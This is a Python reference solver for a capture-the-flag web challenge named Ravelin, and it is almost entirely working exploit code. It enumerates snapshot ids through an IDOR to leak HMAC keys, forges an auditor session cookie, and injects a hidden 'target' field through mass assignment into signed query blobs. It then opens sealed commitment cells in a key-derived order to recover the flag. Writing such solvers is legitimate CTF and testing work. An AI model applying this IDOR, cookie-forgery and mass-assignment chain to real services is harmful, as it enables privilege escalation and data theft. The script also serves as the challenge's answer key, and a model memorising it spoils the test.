#!/usr/bin/env python3
"""
ZSCTF :: Ravelin -- reference solver.

Drives the full three-stage chain end to end. Every stage is load-bearing; the
solver proves each one before relying on it, and rejects each decoy by the same
verifiable discriminator a careful human would use.

  Stage 1 (IDOR, CWE-639): enumerate /api/snapshot/<id> and collect every
    disclosed HMAC key candidate. Reject flag-shaped strings that fail the
    published validator ^zerosecurectf\\{[a-z0-9_]{8,48}\\}$ (R1 decoy flag).

  Stage 2 (signature forgery -> privilege escalation, CWE-347/CWE-285): for each
    candidate key, forge a rav_session cookie claiming role=auditor and ask
    /api/whoami. The REAL key makes the server echo role=auditor; a near-miss
    key (R2/R3) fails the HMAC gate and stays guest -- that is the discriminator
    that rejects the decoy key. With the real cookie, read /auditor/config to
    obtain the vault query-signing key and the live vault handle (rejecting the
    'qa-fixture' handle, R4b).

  Stage 3 (mass assignment / unsafe deserialisation, CWE-915/CWE-502): forge a
    signed SavedQuery blob that injects a `target` field (which the UI never
    sets) naming the live vault handle, POST it to /auditor/query/render. This no
    longer yields the flag: the vault is SEALED and returns a manifest of N
    salted-hash commitments.

  Stage 3b (commitment/opening in a derived order -- S2/S2a extraction): the
    flag is split into N fragments, each sealed in a commitment cell. Derive the
    opening order (a derangement of range(N)) from the vault query-signing key,
    then open each cell at its assigned step by injecting integer `cell`/`step`
    fields into further SavedQuery blobs. Concatenating the correctly-ordered
    openings yields the flag; every fragment is verified against its published
    commitment. The naive "cell i at step i" index order is shown to assemble a
    flag-shaped near-miss that fails the strict validator -- a rejectable decoy.

Stdlib only (no third-party deps). Usage:
    python solve.py --url http://HOST:PORT
    python solve.py --remote HOST:PORT
"""
import sys
import re
import json
import base64
import hmac
import hashlib
import argparse
import urllib.request
import urllib.error

STRICT = re.compile(r"^zerosecurectf\{[a-z0-9_]{8,48}\}$")
# Loose "looks like a flag" detector used to confirm the sealed manifest never
# carries a whole flag (the manifest should be hashes only).
FLAG_SHAPED = re.compile(r"zer[o0]securectf\{[^}]{4,}\}").search


# ---- signing primitives (identical scheme to the server) ------------------
def _b64u(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def sign_token(key_hex: str, payload: dict) -> str:
    raw = json.dumps(payload, separators=(",", ":"), sort_keys=True).encode()
    p = _b64u(raw)
    sig = _b64u(hmac.new(bytes.fromhex(key_hex), p.encode(), hashlib.sha256).digest())
    return p + "." + sig


# ---- sealed-cell extraction: order + commitment derivation ----------------
# Identical scheme to the server (challenge/app.py); replicated here so the
# solver can reproduce the key-derived opening order and verify every opening.
SEAL_V = b"sealed-cells/v1"


def seal_order(vault_key_hex, n):
    """Derangement of range(n) from the vault key -- order[step] -> cell id."""
    key = bytes.fromhex(vault_key_hex)
    ctr = 0
    while True:
        stream, j = b"", 0
        while len(stream) < n * 4:
            stream += hashlib.sha256(key + b"|" + SEAL_V + b"/order|"
                                     + str(ctr).encode() + b"|"
                                     + str(j).encode()).digest()
            j += 1
        perm = list(range(n))
        for i in range(n - 1, 0, -1):
            r = int.from_bytes(stream[i * 4:i * 4 + 4], "big") % (i + 1)
            perm[i], perm[r] = perm[r], perm[i]
        if all(perm[p] != p for p in range(n)):
            return perm
        ctr += 1


def seal_nonce(vault_key_hex, cell):
    return hashlib.sha256(bytes.fromhex(vault_key_hex) + b"|" + SEAL_V
                          + b"/nonce|" + str(cell).encode()).digest()


def seal_verify(vault_key_hex, cell, fragment, commit_b64u):
    """True iff `fragment` genuinely opens `commit_b64u` for `cell`."""
    want = _b64u(hashlib.sha256(seal_nonce(vault_key_hex, cell) + b"|"
                                + fragment.encode()).digest())
    return hmac.compare_digest(want, commit_b64u)


# ---- tiny HTTP helpers (stdlib) -------------------------------------------
def _req(method, url, cookie=None, body=None):
    headers = {"Accept": "application/json"}
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    if cookie:
        headers["Cookie"] = "rav_session=" + cookie
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def get(base, path, cookie=None):
    return _req("GET", base + path, cookie=cookie)


def post(base, path, body, cookie=None):
    return _req("POST", base + path, cookie=cookie, body=body)


# ---------------------------------------------------------------------------
def solve(base):
    # ---- Stage 1: IDOR enumeration -> candidate signing keys --------------
    candidates = []
    seen_decoy_flag = None
    for sid in range(4100, 4130):
        st, txt = get(base, "/api/snapshot/%d" % sid)
        if st != 200:
            continue
        try:
            snap = json.loads(txt)
        except ValueError:
            continue
        # Note any flag-shaped string, but reject it unless it is a LIVE flag
        # served from the vault; quarantined/legacy tokens are not flags.
        for m in re.finditer(r"(zer[o0]securectf\{[^}]*\})", json.dumps(snap)):
            cand = m.group(1)
            if not STRICT.match(cand):
                seen_decoy_flag = cand      # R1: fails the strict validator
        key = snap.get("hmac_key_hex")
        if isinstance(key, str) and re.fullmatch(r"[0-9a-f]{64}", key):
            candidates.append((sid, key, snap.get("status")))
    if seen_decoy_flag:
        print("[i] ignored a flag-shaped quarantined token (fails strict format): %s"
              % seen_decoy_flag)
    if not candidates:
        raise SystemExit("[-] stage 1 failed: no signing-key candidate leaked via IDOR")
    print("[+] stage 1 (IDOR): %d key candidate(s) disclosed: %s"
          % (len(candidates), [f"{sid}:{status}" for sid, _, status in candidates]))

    # ---- Stage 2: forge an auditor cookie; the HMAC gate rejects bad keys --
    session_key = None
    auditor_cookie = None
    for sid, key, status in candidates:
        cookie = sign_token(key, {"user": "attacker", "role": "auditor"})
        st, txt = get(base, "/api/whoami", cookie=cookie)
        role = (json.loads(txt).get("role") if st == 200 else None)
        if role == "auditor":
            session_key = key
            auditor_cookie = cookie
            print("[+] stage 2 (forgery): snapshot %d key verifies -> server grants role=auditor"
                  % sid)
        else:
            print("[i] rejected candidate from snapshot %d (status=%s): HMAC gate kept role=%s"
                  % (sid, status, role))
    if not auditor_cookie:
        raise SystemExit("[-] stage 2 failed: no leaked key produced a valid auditor cookie")

    # Read the auditor console for the vault signing key + the LIVE vault handle.
    st, txt = get(base, "/auditor/config", cookie=auditor_cookie)
    if st != 200:
        raise SystemExit("[-] stage 2 failed: /auditor/config not reachable (status=%s)" % st)
    cfg = json.loads(txt)
    vault_key = cfg["vault_sign_key"]
    render_ep = cfg["query"]["render_endpoint"]
    # Reject the QA fixture handle; choose the handle whose source is live.
    live_handles = [h["handle"] for h in cfg["vault_index"] if h.get("source") == "live-vault"]
    fixture_handles = [h["handle"] for h in cfg["vault_index"] if h.get("source") == "qa-fixture"]
    if fixture_handles:
        print("[i] ignored QA-fixture vault handle(s): %s" % fixture_handles)
    if not live_handles:
        raise SystemExit("[-] stage 2 failed: no live vault handle advertised")
    target = live_handles[0]
    print("[+] stage 2 (console): obtained vault key; live handle = %r" % target)

    # ---- Stage 3: mass-assignment injection via a forged SavedQuery blob ---
    # Sanity: the LEGIT builder never lets us set `target`, so its render is
    # benign (this is what makes stage 3 necessary, not optional).
    st, txt = post(base, "/auditor/query/new",
                   {"name": "benign", "filter": "", "target": target},
                   cookie=auditor_cookie)
    legit_blob = json.loads(txt)["saved_query"]
    st, txt = post(base, render_ep, {"saved_query": legit_blob}, cookie=auditor_cookie)
    if "zerosecurectf" in txt or json.loads(txt)["result"].get("kind") == "vault-sealed":
        raise SystemExit("[-] unexpected: the legit query path reached the vault")
    print("[+] stage 3 (control): the legit SavedQuery path renders only benign rows")

    def render_target(**fields):
        base_fields = {"name": "x", "filter": ""}
        base_fields.update(fields)
        forged = sign_token(vault_key, {"__type__": "SavedQuery", "fields": base_fields})
        st, txt = post(base, render_ep, {"saved_query": forged}, cookie=auditor_cookie)
        if st != 200:
            raise SystemExit("[-] stage 3 failed: render rejected the forged blob (status=%s)" % st)
        return json.loads(txt)["result"]

    # The exploit: inject `target` to reach the vault. It is SEALED -> manifest.
    manifest = render_target(target=target)
    if manifest.get("kind") != "vault-sealed" or manifest.get("source") != "live-vault":
        raise SystemExit("[-] stage 3: expected a sealed manifest from the live vault: %r" % manifest)
    if FLAG_SHAPED(json.dumps(manifest)):
        raise SystemExit("[-] stage 3: the manifest unexpectedly contained a flag-shaped string")
    n = manifest["cells"]
    commits = {c["cell"]: c["commit"] for c in manifest["commitments"]}
    print("[+] stage 3 (injection): target='%s' -> sealed vault manifest (%d commitment cells)"
          % (target, n))

    # ---- Stage 3b: open the commitments in the KEY-DERIVED order -----------
    # Footgun control: the naive "cell i at step i" index order yields a decoy.
    naive = "".join(render_target(target=target, cell=p, step=p).get("fragment") or ""
                    for p in range(n))
    if STRICT.match(naive):
        raise SystemExit("[-] unexpected: the naive index-order open produced a strict-valid flag")
    print("[i] naive index-order open assembles a rejectable near-flag "
          "(fails strict format): %s" % naive)

    order = seal_order(vault_key, n)              # order[step] -> cell id
    frags = []
    for p in range(n):
        cell = order[p]
        res = render_target(target=target, cell=cell, step=p)
        frag = res.get("fragment")
        if frag is None:
            raise SystemExit("[-] stage 3b: cell %d/step %d returned no fragment" % (cell, p))
        if not seal_verify(vault_key, cell, frag, commits[cell]):
            raise SystemExit("[-] stage 3b: fragment from cell %d failed its commitment "
                             "(opened at the wrong step?)" % cell)
        frags.append(frag)
    flag = "".join(frags)
    if not STRICT.match(flag):
        raise SystemExit("[-] stage 3b: ordered openings did not assemble a valid flag: %r" % flag)
    print("[+] stage 3b (commitment opening): opened %d cells in the key-derived "
          "order; every fragment verified against its commitment" % n)
    return flag


def _normalise(url):
    if url.startswith("http://") or url.startswith("https://"):
        return url.rstrip("/")
    return "http://" + url.rstrip("/")


def main():
    ap = argparse.ArgumentParser(description="Ravelin reference solver (IDOR -> cookie forgery -> mass assignment).")
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--url", metavar="http://HOST:PORT", help="base URL of the running service")
    g.add_argument("--remote", metavar="HOST:PORT", help="host:port of the running service")
    args = ap.parse_args()
    base = _normalise(args.url or args.remote)
    try:
        flag = solve(base)
    except urllib.error.URLError as e:
        print("[-] network error talking to %s: %s" % (base, e))
        return 1
    print("[+] FLAG =", flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
